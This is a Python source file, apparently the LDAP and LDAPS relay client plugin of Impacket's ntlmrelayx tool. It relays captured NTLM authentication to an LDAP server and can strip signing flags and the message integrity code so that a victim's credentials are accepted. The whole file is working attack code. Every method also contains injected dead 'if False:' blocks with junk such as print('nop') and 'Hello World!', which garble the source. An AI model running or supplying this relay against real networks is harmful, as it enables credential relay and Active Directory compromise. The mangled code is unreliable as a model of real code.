import sys
from struct import unpack
from impacket import LOG
from ldap3 import Server, Connection, ALL, NTLM, MODIFY_ADD
from ldap3.operation import bind
try:
    from ldap3.core.results import RESULT_SUCCESS, RESULT_STRONGER_AUTH_REQUIRED
except ImportError:
    LOG.fatal("ntlmrelayx requires ldap3 > 2.0. To update, use: 'python -m pip install ldap3 --upgrade'")
    sys.exit(1)
from impacket.examples.ntlmrelayx.clients import ProtocolClient
from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED
from impacket.ntlm import NTLMAuthChallenge, NTLMSSP_AV_FLAGS, AV_PAIRS, NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_SIGN, NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMAuthChallengeResponse, NTLMSSP_NEGOTIATE_KEY_EXCH, NTLMSSP_NEGOTIATE_VERSION
from impacket.spnego import SPNEGO_NegTokenResp
PROTOCOL_CLIENT_CLASSES = ['LDAPRelayClient', 'LDAPSRelayClient']

class LDAPRelayClientException(Exception):
    pass

class LDAPRelayClient(ProtocolClient):
    PLUGIN_NAME = 'LDAP'
    MODIFY_ADD = MODIFY_ADD

    def __init__(self, serverConfig, target, targetPort=389, extendedSecurity=True):
        if False:
            for i in range(10):
                print('nop')
        ProtocolClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)
        self.extendedSecurity = extendedSecurity
        self.negotiateMessage = None
        self.authenticateMessageBlob = None
        self.server = None

    def killConnection(self):
        if False:
            print('Hello World!')
        if self.session is not None:
            self.session.socket.close()
            self.session = None

    def initConnection(self):
        if False:
            print('Hello World!')
        self.server = Server('ldap://%s:%s' % (self.targetHost, self.targetPort), get_info=ALL)
        self.session = Connection(self.server, user='a', password='b', authentication=NTLM)
        self.session.open(False)
        return True

    def sendNegotiate(self, negotiateMessage):
        if False:
            i = 10
            return i + 15
        negoMessage = NTLMAuthNegotiate()
        negoMessage.fromString(negotiateMessage)
        if self.serverConfig.remove_mic:
            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
        self.negotiateMessage = negoMessage.getData()
        if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
            LOG.warning('The client requested signing. Relaying to LDAP will not work! (This usually happens when relaying from SMB to LDAP)')
        with self.session.connection_lock:
            if not self.session.sasl_in_progress:
                self.session.sasl_in_progress = True
                request = bind.bind_operation(self.session.version, 'SICILY_PACKAGE_DISCOVERY')
                response = self.session.post_send_single_response(self.session.send('bindRequest', request, None))
                result = response[0]
                try:
                    sicily_packages = result['server_creds'].decode('ascii').split(';')
                except KeyError:
                    raise LDAPRelayClientException('Could not discover authentication methods, server replied: %s' % result)
                if 'NTLM' in sicily_packages:
                    request = bind.bind_operation(self.session.version, 'SICILY_NEGOTIATE_NTLM', self)
                    response = self.session.post_send_single_response(self.session.send('bindRequest', request, None))
                    result = response[0]
                    if result['result'] == RESULT_SUCCESS:
                        challenge = NTLMAuthChallenge()
                        challenge.fromString(result['server_creds'])
                        return challenge
                else:
                    raise LDAPRelayClientException('Server did not offer NTLM authentication!')

    def create_negotiate_message(self):
        if False:
            while True:
                i = 10
        return self.negotiateMessage

    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
        if False:
            for i in range(10):
                print('nop')
        if unpack('B', authenticateMessageBlob[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
            respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
            token = respToken2['ResponseToken']
        else:
            token = authenticateMessageBlob
        authMessage = NTLMAuthChallengeResponse()
        authMessage.fromString(token)
        if self.serverConfig.remove_mic:
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_KEY_EXCH == NTLMSSP_NEGOTIATE_KEY_EXCH:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_KEY_EXCH
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_VERSION == NTLMSSP_NEGOTIATE_VERSION:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_VERSION
            authMessage['MIC'] = b''
            authMessage['MICLen'] = 0
            authMessage['Version'] = b''
            authMessage['VersionLen'] = 0
            token = authMessage.getData()
        with self.session.connection_lock:
            self.authenticateMessageBlob = token
            request = bind.bind_operation(self.session.version, 'SICILY_RESPONSE_NTLM', self, None)
            response = self.session.post_send_single_response(self.session.send('bindRequest', request, None))
            result = response[0]
        self.session.sasl_in_progress = False
        if result['result'] == RESULT_SUCCESS:
            self.session.bound = True
            self.session.refresh_server_info()
            return (None, STATUS_SUCCESS)
        elif result['result'] == RESULT_STRONGER_AUTH_REQUIRED and self.PLUGIN_NAME != 'LDAPS':
            raise LDAPRelayClientException('Server rejected authentication because LDAP signing is enabled. Try connecting with TLS enabled (specify target as ldaps://hostname )')
        return (None, STATUS_ACCESS_DENIED)

    def create_authenticate_message(self):
        if False:
            i = 10
            return i + 15
        return self.authenticateMessageBlob

    def parse_challenge_message(self, message):
        if False:
            while True:
                i = 10
        pass

class LDAPSRelayClient(LDAPRelayClient):
    PLUGIN_NAME = 'LDAPS'
    MODIFY_ADD = MODIFY_ADD

    def __init__(self, serverConfig, target, targetPort=636, extendedSecurity=True):
        if False:
            while True:
                i = 10
        LDAPRelayClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)

    def initConnection(self):
        if False:
            for i in range(10):
                print('nop')
        self.server = Server('ldaps://%s:%s' % (self.targetHost, self.targetPort), get_info=ALL)
        self.session = Connection(self.server, user='a', password='b', authentication=NTLM)
        self.session.open(False)
        return True